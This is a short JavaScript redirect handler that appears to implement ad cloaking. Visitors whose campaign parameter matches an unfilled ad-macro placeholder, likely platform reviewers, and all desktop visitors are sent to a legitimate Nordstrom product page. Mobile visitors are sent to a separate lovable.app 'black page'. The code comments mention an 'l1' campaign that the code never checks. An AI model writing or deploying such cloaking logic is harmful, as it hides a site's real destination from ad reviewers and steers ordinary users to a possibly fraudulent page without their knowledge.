export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.nordstrom.com/s/azelie-floral-print-gown/8535148?origin=coordinating-8535148-0-3-PDP_2.SEEDED_SUB_1-recbot-vertex_fbt_v3&recs_placement=PDP_2.SEEDED_SUB-1&recs_strategy=vertex_fbt_v3&recs_source=recbot&recs_page_type=product&recs_seed=8386592&color=BLACK";
    const blackPageURL = "https://luvcshap.lovable.app/";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }

























